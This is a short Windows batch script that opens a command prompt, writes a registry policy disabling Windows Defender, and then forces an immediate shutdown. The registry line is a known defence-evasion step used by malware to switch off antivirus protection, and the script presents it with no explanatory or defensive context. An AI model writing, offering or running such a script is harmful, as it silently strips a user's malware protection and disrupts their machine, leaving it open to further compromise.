@echo off
cls

:: Open Command Prompt
start cmd /k

:: Disable Windows Defender via registry
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

:: Shut down the computer
shutdown /s /t 0
